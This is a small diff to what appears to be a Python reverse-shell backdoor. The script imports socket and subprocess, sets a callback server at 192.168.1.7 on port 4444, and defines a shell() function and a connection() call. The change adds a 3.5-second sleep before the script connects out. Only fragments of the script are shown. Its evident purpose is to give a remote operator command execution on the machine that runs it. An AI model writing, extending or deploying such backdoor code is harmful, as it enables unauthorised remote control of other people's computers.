@@ -2,6 +2,7 @@ import socket
 import json
 import subprocess
 import os
+import time
 
 SERVER_IP = "192.168.1.7"
 SERVER_PORT = 4444
@@ -60,4 +61,5 @@ def shell():
 
 
 target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+time.sleep(3.5)
 connection()
